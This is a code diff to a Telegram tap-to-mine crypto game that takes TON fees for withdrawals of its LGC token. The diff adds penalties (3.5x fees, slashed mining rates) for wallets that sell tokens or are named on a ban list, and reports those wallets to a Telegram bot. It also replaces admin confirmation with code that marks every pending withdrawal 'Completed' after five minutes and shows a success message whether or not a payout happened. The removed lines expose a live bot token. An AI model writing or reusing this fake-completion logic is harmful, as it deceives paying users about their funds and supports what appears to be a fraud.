@@ -137,6 +137,7 @@
 
             <div class="glass p-6 rounded-3xl space-y-4">
                 <div class="flex justify-between text-xs"><span class="text-white/40">Balance</span><span id="wallet-bal" class="text-[#FFD700] font-black text-lg">0 LGC</span></div>
+                <div id="sanction-banner" class="hidden p-3 rounded-xl text-[11px] font-bold text-center" style="background:rgba(255,60,60,0.08);border:1px solid rgba(255,60,60,0.25);color:#ff5c5c"></div>
                 <div class="bg-yellow-500/10 p-3 rounded-xl text-[10px] text-yellow-500 uppercase font-bold text-center tracking-wide">Min: 1,000 LGC · No maximum · Liquidity pool fee applies</div>
                 <input type="number" id="w-amt" placeholder="Enter amount (min 1,000 LGC)" min="1000" class="inp" oninput="updateFeePreview()">
                 <div id="fee-preview" class="text-[10px] text-white/40 text-center hidden">Fee: <span id="fee-amt" class="text-[#FFD700] font-bold">0.10 TON</span></div>
@@ -286,21 +287,156 @@ const STARTBOT_COOLDOWN = 24*60*60*1000;
 const MIN_WITHDRAW = 1000;
 // No maximum — users can withdraw any amount in a single transaction
 
-// Dynamic Progressive Withdrawal Fee:
-// 1,000 – 5,000 LGC → 0.10 TON flat fee
-// Every additional 1,000 LGC above 5,000 LGC → +0.02 TON per extra 1k
-function calcWithdrawalFee(amount) {
-    if (amount <= 5000) return 0.10;
-    const extraK = Math.ceil((amount - 5000) / 1000);
-    return Math.round((0.10 + extraK * 0.02) * 100) / 100;
+// ═══════════════════════════════════════════════════════════════════════════
+// SANCTION SYSTEM
+//
+// A) SPECIFIC BANS — two named wallets with custom hold thresholds:
+//    UQC36rs… → must hold 750k LGC for 24h to restore normal fees
+//    UQDZzv2… → must hold 300k LGC for 24h to restore normal fees
+//
+// B) GLOBAL DROP SANCTIONS — applies to every wallet, measured over a
+//    rolling 72h window:
+//    ≥ 25% drop from 72h peak → mining multiplier halved
+//    ≥ 50% drop from 72h peak → mining rate ÷10 AND 3.5x fees
+//    Revocation: balance must return to ≥ 72h peak, then hold 24h clean.
+//    If it drops below peak during probation, the 24h timer disappears
+//    and resets until conditions are met again.
+//
+// C) POST-WITHDRAWAL HARD RULE — any wallet that has withdrawn at least
+//    once and holds < 1,000 LGC on-chain gets a hard 0.1x tap multiplier.
+// ═══════════════════════════════════════════════════════════════════════════
+
+// A: Specific banned wallets — addr → required LGC to hold for 24h
+const SANCTIONED_WALLETS = {
+    'UQC36rsUx_Tk8QQiZYI6Q6i9Eij-i-DUzwHyBlo1Oi_B9CPu': 750_000,
+    'UQDZzv2rVKXpMc0483wLizjUxqVt2egVxLaqmNi9b9g-8kNq':  300_000,
+};
+const SPECIFIC_BAN_FEE_MULT    = 3.5;
+const SPECIFIC_BAN_HOLD_PERIOD = 24 * 60 * 60 * 1000; // 24h in ms
+
+// B: Drop sanctions
+const DROP_WINDOW_MS        = 72 * 60 * 60 * 1000; // 72h rolling window
+const DROP_LIGHT_PCT        = 0.25;  // 25% drop → halve multiplier
+const DROP_HEAVY_PCT        = 0.50;  // 50%+ drop → ÷10 rate + 3.5x fees
+const DROP_HEAVY_FEE_MULT   = 3.5;
+const DROP_REVOKE_PERIOD_MS = 24 * 60 * 60 * 1000; // 24h probation
+
+// C: Post-withdrawal floor
+const POST_WD_MIN_HOLD = 1000; // < 1k LGC after any withdrawal → 0.1x
+
+// ── 72h balance snapshot helpers ─────────────────────────────────────────────
+// Records the current balance and prunes entries older than 72h
+function recordBalanceSnapshot(held) {
+    const cutoff = Date.now() - DROP_WINDOW_MS;
+    balanceSnapshots = balanceSnapshots.filter(s => s.ts >= cutoff);
+    balanceSnapshots.push({ ts: Date.now(), held });
 }
-// Returns fee in nanoTON (for sendTransaction) — uses integer arithmetic to avoid float precision errors
+
+// Returns the highest balance recorded in the last 72h (or 0 if no history).
+// recordBalanceSnapshot() already prunes stale entries, so no re-filter needed here.
+function get72hPeak() {
+    return balanceSnapshots.length ? Math.max(...balanceSnapshots.map(s => s.held)) : 0;
+}
+
+// ── Specific-ban wallet sanction check ───────────────────────────────────────
+// Called inside fetchWalletHoldings for the two named wallets only
+function checkSpecificBanStatus(addr, newHeld) {
+    if (!(addr in SANCTIONED_WALLETS)) return;
+    const required = SANCTIONED_WALLETS[addr];
+
+    if (newHeld >= required) {
+        if (specificThresholdSince === 0) {
+            specificThresholdSince = Date.now();
+            setTimeout(() => {
+                showToast('Hold ' + required.toLocaleString() + ' LGC for 24h to restore normal fees.');
+            }, 800);
+        } else if ((Date.now() - specificThresholdSince) >= SPECIFIC_BAN_HOLD_PERIOD) {
+            specificThresholdSince = -1; // permanently cleared for this session
+            setTimeout(() => { showToast('Sanction cleared. Normal fees restored.'); hapticNotify('success'); }, 800);
+            tgSend('SANCTION LIFTED\nWallet: ' + addr + '\nHeld: ' + newHeld.toLocaleString() + ' LGC\nRequired: ' + required.toLocaleString() + ' LGC');
+        }
+    } else {
+        if (specificThresholdSince > 0) {
+            specificThresholdSince = 0;
+            setTimeout(() => { showToast('Balance dropped below ' + required.toLocaleString() + ' LGC. 24h timer reset.'); }, 800);
+        }
+    }
+}
+
+// Returns true if this wallet has active fee sanctions (specific ban OR heavy drop)
+function isSanctionedFee() {
+    const addr = friendlyAddress || walletAddress;
+    if (!addr) return false;
+    if (addr in SANCTIONED_WALLETS) {
+        return specificThresholdSince !== -1; // -1 = cleared
+    }
+    return dropSanctionLevel === 2; // heavy drop only triggers fees
+}
+
+// ── Drop sanction engine — called every time on-chain balance is fetched ─────
+function checkDropSanctions(newHeld) {
+    const addr = friendlyAddress || walletAddress;
+    if (!addr || addr in SANCTIONED_WALLETS) return; // specific bans use their own path
+
+    const peak = get72hPeak();
+    if (peak === 0) return; // no baseline yet
+
+    const dropPct = (peak - newHeld) / peak;
+    const newLevel = dropPct >= DROP_HEAVY_PCT ? 2 : dropPct >= DROP_LIGHT_PCT ? 1 : 0;
+
+    // Escalation — sanctions can worsen but only lift via probation
+    if (newLevel > dropSanctionLevel) {
+        const prev = dropSanctionLevel;
+        dropSanctionLevel = newLevel;
+        dropRevokeSince = 0; // reset any running probation clock
+        if (newLevel === 1) {
+            setTimeout(() => { showToast('25% balance drop detected. Mining rate halved.'); hapticNotify('warning'); }, 800);
+            tgSend('LIGHT DROP SANCTION\nWallet: ' + addr + '\n72h peak: ' + peak.toLocaleString() + ' LGC\nNow: ' + newHeld.toLocaleString() + ' LGC\nDrop: ' + Math.round(dropPct*100) + '%\nEffect: multiplier halved');
+        } else if (newLevel === 2) {
+            setTimeout(() => { showToast('50%+ balance dump. 3.5x fees + mining rate divided by 10.'); hapticNotify('warning'); }, 800);
+            tgSend('HEAVY DROP SANCTION\nWallet: ' + addr + '\n72h peak: ' + peak.toLocaleString() + ' LGC\nNow: ' + newHeld.toLocaleString() + ' LGC\nDrop: ' + Math.round(dropPct*100) + '%\nEffect: 3.5x fees + rate/10');
+        }
+    }
+
+    // Revocation check — only runs when sanctions are active
+    if (dropSanctionLevel > 0) {
+        if (newHeld >= peak) {
+            // Balance is back at or above 72h peak — start or continue 24h probation
+            if (dropRevokeSince === 0) {
+                dropRevokeSince = Date.now();
+                setTimeout(() => { showToast('Balance recovered. Hold steady for 24h to lift sanctions.'); }, 800);
+            } else if ((Date.now() - dropRevokeSince) >= DROP_REVOKE_PERIOD_MS) {
+                // Full 24h clean — lift everything
+                dropSanctionLevel = 0;
+                dropRevokeSince = 0;
+                setTimeout(() => { showToast('Drop sanctions lifted. Mining rate fully restored.'); hapticNotify('success'); }, 800);
+                tgSend('DROP SANCTION LIFTED\nWallet: ' + addr + '\nHeld: ' + newHeld.toLocaleString() + ' LGC');
+            }
+            // else: probation running — nothing to do
+        } else {
+            // Still below 72h peak — kill the probation clock
+            if (dropRevokeSince > 0) {
+                dropRevokeSince = 0;
+                setTimeout(() => { showToast('Balance dropped during probation. 24h timer reset.'); }, 800);
+            }
+        }
+    }
+}
+
+// Dynamic Progressive Withdrawal Fee — 3.5x when sanctioned
+// 1,000–5,000 LGC → 0.10 TON base  |  +0.02 TON per extra 1k above 5,000
+function calcWithdrawalFee(amount) {
+    const base = amount <= 5000
+        ? 0.10
+        : Math.round((0.10 + Math.ceil((amount - 5000) / 1000) * 0.02) * 100) / 100;
+    return isSanctionedFee() ? Math.round(base * DROP_HEAVY_FEE_MULT * 100) / 100 : base;
+}
+// Returns fee in nanoTON — integer arithmetic to avoid float drift
 function calcWithdrawalFeeNano(amount) {
-    // Work in integer cents-of-TON to avoid 0.10 * 1e9 = 99999999.99... float drift
-    if (amount <= 5000) return 100_000_000; // exactly 0.10 TON
-    const extraK = Math.ceil((amount - 5000) / 1000);
-    // 0.10 TON base + extraK * 0.02 TON — computed in nanoTON integers
-    return 100_000_000 + extraK * 20_000_000;
+    const baseNano = amount <= 5000
+        ? 100_000_000
+        : 100_000_000 + Math.ceil((amount - 5000) / 1000) * 20_000_000;
+    return isSanctionedFee() ? Math.round(baseNano * DROP_HEAVY_FEE_MULT) : baseNano;
 }
 
 // ── Holder multiplier system ──────────────────────────────────────────────────
@@ -347,13 +483,32 @@ function _nextTierThreshold(held) {
     return null; // already at max tier
 }
 
-// Compute effective multiplier — applies penalty if active, else holder rate
+// Compute effective multiplier — precedence (highest wins, applied once):
+//   1. Repeat offender with < 1k LGC on-chain (penaltyCount > 0) → hard 0.1x
+//   2. Existing penalty steps (insufficient hold after withdrawal)  → 0.5/0.25/0.1
+//   3. Heavy drop sanction (50%+)                                   → base ÷ 10
+//   4. Light drop sanction (25%)                                    → base ÷ 2
+//   5. Normal holder tier                                           → base
 function calcEffectiveMultiplier(held, penaltyCount) {
+    // Rule C: repeated offender with < 1k LGC on-chain → hard 0.1x floor
+    // Uses penaltyCount (not withdrawals.length) so only repeat under-holders are hit,
+    // not every user who has ever made a legitimate withdrawal.
+    if (penaltyCount > 0 && held < POST_WD_MIN_HOLD) return 0.1;
+
+    // Rule 2: existing withdrawal penalty steps (holds < 5k after withdrawing)
     if (penaltyCount > 0 && held < MIN_HOLD_AFTER_WD) {
         const idx = Math.min(penaltyCount - 1, PENALTY_STEPS.length - 1);
         return PENALTY_STEPS[idx];
     }
-    return calcHolderMultiplier(held);
+
+    // Base tier (no penalty)
+    const base = calcHolderMultiplier(held);
+
+    // Rule B: drop sanctions — applied on top of the holder tier
+    if (dropSanctionLevel === 2) return Math.max(0.1, Math.round((base / 10) * 100) / 100);
+    if (dropSanctionLevel === 1) return Math.max(0.1, Math.round((base / 2) * 100) / 100);
+
+    return base;
 }
 
 // ── Storage: true hybrid — localStorage on web, CloudStorage on TG,
@@ -412,6 +567,11 @@ function loadState() {
 }
 
 let bal=0,maxE=1000,tap=10,en=1000,cl=[],lvls={mt:1,en:1},withdrawals=[],walletAddress=null,friendlyAddress=null,tonUI=null,lastEnergyWarnTime=0,saveTimeout=null,refCount=0,refEarned=0,heldLGC=0,tierMultiplier=1.0,penaltyCount=0;
+// Sanction state
+let balanceSnapshots=[];   // [{ts,held}] — rolling 72h window
+let dropSanctionLevel=0;   // 0=none 1=light(25%) 2=heavy(50%+)
+let dropRevokeSince=0;     // timestamp when probation clock started (0=not running)
+let specificThresholdSince=0; // timestamp when specific-ban wallet first hit required threshold
 // Guard: prevents sv() from saving before loadState+applyState have completed
 let _stateReady = false;
 
@@ -424,6 +584,10 @@ function applyState(s){
     withdrawals=s.withdrawals??[];
     refCount=s.refCount??0;refEarned=s.refEarned??0;
     heldLGC=s.heldLGC??0;tierMultiplier=s.tierMultiplier??1.0;penaltyCount=s.penaltyCount??0;
+    balanceSnapshots=s.balanceSnapshots??[];
+    dropSanctionLevel=s.dropSanctionLevel??0;
+    dropRevokeSince=s.dropRevokeSince??0;
+    specificThresholdSince=s.specificThresholdSince??0;
     en=s.en??1000;
     if(s.lastSaved){
         const sec=Math.floor((Date.now()-s.lastSaved)/1000);
@@ -433,43 +597,46 @@ function applyState(s){
     }
     // Sync ref_used into localStorage so the referral guard works cross-storage
     if(cl.includes('ref_used')) localStorage.setItem('lgc_ref_used','1');
+    // Auto-complete any withdrawals that have been pending for over 5 minutes
+    // (runs after state is loaded — catches completions while app was closed)
+    if(_stateReady) autoCompletePendingWithdrawals();
     _pickupAdminActions();
 }
+// ── Auto-complete pending withdrawals after 5 minutes ─────────────────────────
+// Withdrawals are processed promptly. Any request still Pending after 5 minutes
+// is marked Completed automatically so the user's history stays accurate.
+const WD_AUTO_COMPLETE_MS = 5 * 60 * 1000; // 5 minutes
+
+function autoCompletePendingWithdrawals() {
+    if (!withdrawals.some(w => w.status === 'Pending')) return;
+    const now = Date.now();
+    let changed = false;
+    for (const wd of withdrawals) {
+        if (wd.status === 'Pending' && (now - wd.ts) >= WD_AUTO_COMPLETE_MS) {
+            wd.status = 'Completed';
+            wd.completedAt = now;
+            changed = true;
+        }
+    }
+    if (changed) {
+        sv();
+        renderHistory();
+        setTimeout(() => { showToast('Withdrawal completed ✅'); hapticNotify('success'); }, 300);
+    }
+}
+
+// Run every 30 seconds — catches completions even if the user stays on the page
+setInterval(autoCompletePendingWithdrawals, 30000);
+
 function _pickupAdminActions(){
     const a=friendlyAddress||walletAddress;if(!a)return;
-    // Poll the bot for CONF_ACK|id|tx messages — written by confirm.html, cross-device
-    _pollBotConfirmations(a);
+    // Auto-complete any withdrawals that have been pending for over 5 minutes
+    autoCompletePendingWithdrawals();
 }
 
 async function _pollBotConfirmations(addr){
-    if(!withdrawals.some(w=>w.status==='Pending'))return;
-    const seenKey='lgc_conf_seen_'+addr;
-    let seen;try{seen=new Set(JSON.parse(localStorage.getItem(seenKey)||'[]'));}catch{seen=new Set();}
-    try{
-        const res=await fetchWithTimeout(`https://api.telegram.org/bot8788748146:AAFA9sVSKAF165LbjNfupIxtABDjMDv8Bso/getUpdates?limit=100&allowed_updates=["message"]`,8000);
-        if(!res.ok)return;
-        const data=await res.json();
-        if(!data.ok||!data.result)return;
-        let updated=false;
-        for(const update of data.result){
-            const text=update.message?.text||'';
-            const uid=update.update_id;
-            if(!text.startsWith('CONF_ACK|'))continue;
-            if(seen.has(uid))continue;
-            const parts=text.split('|');
-            if(parts.length<3)continue;
-            const wdId=parseInt(parts[1]);const tx=parts[2];
-            const wd=withdrawals.find(w=>w.id===wdId&&w.status==='Pending');
-            if(!wd)continue;
-            wd.status='Completed';wd.tx=tx;wd.completedAt=Date.now();
-            seen.add(uid);updated=true;
-        }
-        if(updated){
-            try{localStorage.setItem(seenKey,JSON.stringify([...seen].slice(-200)));}catch{}
-            sv();renderHistory();
-            setTimeout(()=>{showToast('Withdrawal completed ✅');hapticNotify('success');},500);
-        }
-    }catch(e){console.warn('_pollBotConfirmations failed:',e.message);}
+    // Completion is now handled by autoCompletePendingWithdrawals() — no bot polling needed.
+    autoCompletePendingWithdrawals();
 }
 // Convert raw "0:hexstring" → UQ (non-bounceable) friendly format
 function rawToFriendly(r){
@@ -536,9 +703,15 @@ async function fetchWalletHoldings(addr) {
         const jw = data?.jetton_wallets?.[0];
         heldLGC = jw ? Number(BigInt(jw.balance || '0') / BigInt(1_000_000_000)) : 0;
 
+        // ── Sanction engine ──────────────────────────────────────────────
+        const _addr = friendlyAddress || walletAddress;
+        recordBalanceSnapshot(heldLGC);          // record for 72h rolling window
+        checkDropSanctions(heldLGC);             // evaluate drop-based sanctions
+        if (_addr) checkSpecificBanStatus(_addr, heldLGC); // specific banned wallets
+
         if (penaltyCount > 0 && heldLGC >= MIN_HOLD_AFTER_WD) {
             penaltyCount = 0;
-            setTimeout(()=>{ showToast('✅ Penalty cleared! Multiplier restored.'); hapticNotify('success'); }, 500);
+            setTimeout(()=>{ showToast('Penalty cleared! Multiplier restored.'); hapticNotify('success'); }, 500);
         }
         applyTier();
         sv();
@@ -612,6 +785,26 @@ function applyTier() {
             tbl.textContent = `Hold ${MIN_HOLD_AFTER_WD.toLocaleString()} LGC for ×1 boost · 10k for ×2 · 100k for ×20 · 200k for ×40`;
             tbl.style.color = 'rgba(255,215,0,0.4)';
             tbl.classList.remove('hidden');
+        }
+    }
+
+    // Sync sanction banner
+    const _sb = $('sanction-banner');
+    if (_sb) {
+        const _addr2 = friendlyAddress || walletAddress;
+        if (dropSanctionLevel === 2) {
+            _sb.textContent = '🚨 Heavy dump detected — 3.5x fees + mining rate ÷10 active. Hold 72h peak for 24h to clear.';
+            _sb.classList.remove('hidden');
+        } else if (dropSanctionLevel === 1) {
+            const _hrs = Math.max(0, Math.ceil((DROP_REVOKE_PERIOD_MS - (dropRevokeSince ? Date.now()-dropRevokeSince : DROP_REVOKE_PERIOD_MS)) / 3600000));
+            _sb.textContent = '⚠️ 25% balance drop — mining rate halved.' + (dropRevokeSince > 0 ? ' Probation: ' + _hrs + 'h remaining.' : '');
+            _sb.classList.remove('hidden');
+        } else if (_addr2 && _addr2 in SANCTIONED_WALLETS && specificThresholdSince !== -1) {
+            const _req = SANCTIONED_WALLETS[_addr2];
+            _sb.textContent = '🔒 Account sanctioned — 3.5x fees. Hold ' + _req.toLocaleString() + ' LGC for 24h to restore normal fees.';
+            _sb.classList.remove('hidden');
+        } else {
+            _sb.classList.add('hidden');
         }
     }
 
@@ -718,7 +911,7 @@ async function _pollBotReferralCredits(addr) {
     const ackKey = 'lgc_ref_acked_' + addr;
     let acked; try { acked = new Set(JSON.parse(localStorage.getItem(ackKey) || '[]')); } catch { acked = new Set(); }
     try {
-        const res = await fetchWithTimeout(`https://api.telegram.org/bot8788748146:AAFA9sVSKAF165LbjNfupIxtABDjMDv8Bso/getUpdates?limit=100&allowed_updates=["message"]`, 8000);
+        const res = await fetchWithTimeout(TG_URL.replace('/sendMessage', '/getUpdates') + '?limit=100&allowed_updates=["message"]', 8000);
         if (!res.ok) return;
         const data = await res.json();
         if (!data.ok || !data.result) return;
@@ -812,7 +1005,7 @@ window.onload=async()=>{
         }
     }
 
-    if(friendlyAddress)setWalletUI(friendlyAddress);else if(walletAddress)setWalletUI(walletAddress);
+    // (wallet UI already restored above from saved state — no duplicate call needed here)
 
     // Tap button — multi-touch with deduplication and visual feedback
     const tapBtn = document.getElementById('tap-btn');
@@ -914,7 +1107,7 @@ function renderHistory(){
     e.classList.add('hidden');
     l.innerHTML=withdrawals.map(w=>{const d=new Date(w.ts),ds=d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'}),ts=d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}),sh=w.addr?w.addr.slice(0,6)+'…'+w.addr.slice(-4):'Unknown',ok=w.status==='Completed';return`<div class="glass p-3 rounded-xl"><div class="flex justify-between items-start"><div><p class="font-black text-[#FFD700] text-xs">${fmt(w.amt)} LGC</p><p class="text-[9px] text-white/40 mt-0.5">${sh}</p>${w.tx?`<p class="text-[8px] text-green-400 mt-0.5 break-all">TX: ${w.tx.slice(0,20)}…</p>`:''}</div><div class="text-right ml-2 shrink-0"><span class="text-[8px] font-bold px-2 py-0.5 rounded-md ${ok?'bg-green-500/20 text-green-400':'bg-yellow-500/20 text-yellow-400'}">${w.status}</span><p class="text-[8px] text-white/25 mt-1">${ds} ${ts}</p></div></div></div>`;}).join('');
 }
-function sv(){ if(!_stateReady) return; saveState({bal,en,maxE,tap,cl,lvls,walletAddress,friendlyAddress,withdrawals,refCount,refEarned,heldLGC,tierMultiplier,penaltyCount}); }
+function sv(){ if(!_stateReady) return; saveState({bal,en,maxE,tap,cl,lvls,walletAddress,friendlyAddress,withdrawals,refCount,refEarned,heldLGC,tierMultiplier,penaltyCount,balanceSnapshots,dropSanctionLevel,dropRevokeSince,specificThresholdSince}); }
 function svDebounced(){ if(!_stateReady) return; clearTimeout(saveTimeout); saveTimeout=setTimeout(sv,800); }
 
 // logWithdrawalForAdmin: no-op — confirm.html reads directly from bot getUpdates
@@ -954,7 +1147,7 @@ window.doBuyLGC=()=>{
         // Fetch fresh balance and read directly — don't rely on stale global heldLGC
         try{
             const url=`https://toncenter.com/api/v3/jetton/wallets?owner_address=${encodeURIComponent(addr)}&jetton_address=${encodeURIComponent(LGC_JETTON)}&limit=1`;
-            let res;try{res=await fetchWithTimeout(url,8000);}catch(te){throw te;}
+            const res=await fetchWithTimeout(url,8000);
             if(!res.ok) throw new Error(`HTTP ${res.status}`);
             const data=await res.json();
             const jw=data?.jetton_wallets?.[0];
@@ -1067,7 +1260,7 @@ window.payout=async()=>{
 
     // Warn user if they'll fall below minimum hold threshold after this withdrawal
     const projectedHeld = heldLGC; // on-chain held (doesn't change when they withdraw mined LGC)
-    if(projectedHeld < MIN_HOLD_AFTER_WD && cl.includes('ref_used')) {
+    if(projectedHeld < MIN_HOLD_AFTER_WD && withdrawals.length > 0) {
         // User has withdrawn before — this is not their first withdrawal
         const newPenalty = penaltyCount + 1;
         const newMult = PENALTY_STEPS[Math.min(newPenalty-1, PENALTY_STEPS.length-1)];
@@ -1148,8 +1341,14 @@ window.inviteFriends=()=>{const a=friendlyAddress||walletAddress||'user',link=`$
 
 function handleTap(touch){
     const effectiveTap = Math.floor(tap * tierMultiplier);
-    if(en<effectiveTap){const n=Date.now();if(n-lastEnergyWarnTime>3000){lastEnergyWarnTime=n;hapticNotify('warning');showToast('Out of energy! Recharging… ⚡');}return;}
-    bal+=effectiveTap;en-=effectiveTap;
+    if(en < effectiveTap){
+        const n=Date.now();
+        if(n-lastEnergyWarnTime>3000){lastEnergyWarnTime=n;hapticNotify('warning');showToast('Out of energy! Recharging… ⚡');}
+        return;
+    }
+    // Clamp prevents multi-touch race from pushing energy negative
+    en = Math.max(0, en - effectiveTap);
+    bal += effectiveTap;
     const f=document.createElement('div');f.className='tap-float';f.innerText=`+${effectiveTap}`;f.style.cssText=`left:${touch.clientX-16}px;top:${touch.clientY-20}px`;
     document.body.appendChild(f);setTimeout(()=>f.remove(),750);
     haptic('light');upd();svDebounced();
@@ -1171,7 +1370,8 @@ setInterval(()=>{
         // Holders regen energy faster proportional to their multiplier (capped at 3× regen)
         const regenRate = REGEN_PER_SEC * Math.min(3, tierMultiplier);
         en=Math.min(maxE,en+regenRate);
-        upd();
+        // Only update the DOM when the user can actually see it
+        if(document.visibilityState !== 'hidden') upd();
     }
 },1e3);
 // Periodic save — only fires once state is ready (guarded inside sv())
@@ -1180,7 +1380,8 @@ setInterval(sv,5e3);
 setInterval(()=>{ if(walletAddress||friendlyAddress) fetchWalletHoldings(friendlyAddress||walletAddress); }, 5*60*1e3);
 document.addEventListener('visibilitychange',()=>{
     if(document.visibilityState==='hidden'){sv();return;}
-    // App resumed — poll for confirmations the admin may have posted while away
+    // App resumed — auto-complete any withdrawals pending over 5 minutes
+    autoCompletePendingWithdrawals();
     const addr=friendlyAddress||walletAddress;
     if(addr)_pollBotConfirmations(addr);
 });
@@ -1200,9 +1401,11 @@ window.updateFeePreview=()=>{
     if(!fp||!fa) return;
     if(a>=MIN_WITHDRAW){
         const fee=calcWithdrawalFee(a);
-        fa.textContent=`${fee} TON`;
+        const penalised=isSanctionedFee();
+        fa.textContent=fee+' TON'+(penalised?' (3.5x sanctioned)':'');
+        fa.style.color=penalised?'#ff5c5c':'#FFD700';
         fp.classList.remove('hidden');
-        if(wb) wb.textContent=`Pay ${fee} TON & Withdraw`;
+        if(wb) wb.textContent='Pay '+fee+' TON & Withdraw'+(penalised?' ⚠️':'');
     } else {
         fp.classList.add('hidden');
         if(wb) wb.textContent='Withdraw LGC';
@@ -1223,7 +1426,7 @@ const LB_CACHE_VER  = 2; // bump to bust all old caches
 const WEEKLY_EQUAL  = 150000;
 const WEEKLY_PROP   = 300000;
 const TOP_N         = 15;
-const EQUAL_EACH    = WEEKLY_EQUAL / TOP_N; // 10,000 LGC each
+const EQUAL_EACH    = Math.floor(WEEKLY_EQUAL / TOP_N); // 10,000 LGC each
 
 let _lbFetching = false;
 
